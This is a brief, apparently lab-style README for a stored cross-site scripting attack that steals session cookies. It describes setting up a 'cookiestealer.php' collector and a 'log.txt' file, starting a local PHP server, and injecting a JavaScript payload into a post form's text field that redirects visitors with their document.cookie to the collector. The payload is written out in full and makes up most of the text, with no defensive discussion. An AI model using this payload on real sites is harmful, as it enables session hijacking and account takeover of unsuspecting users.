## Setup
1. Creation of "cookiestealer.php". Contains information of transfer to which location. This can be every website. For realistic scenario it should be the website from where the attack is happening.
2. Creation of "log.txt" for storing the cookie information.

## Attack for session cookie
1. Starting server with php -S 127.0.0.1:4859 (":4859") is any port
2. Inserting in "post_erstellen.html" in input field "Text:" JS code (without JS tags) --> document.location = "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;document.cookie = "username=Null Byte";document.write(document.cookie);
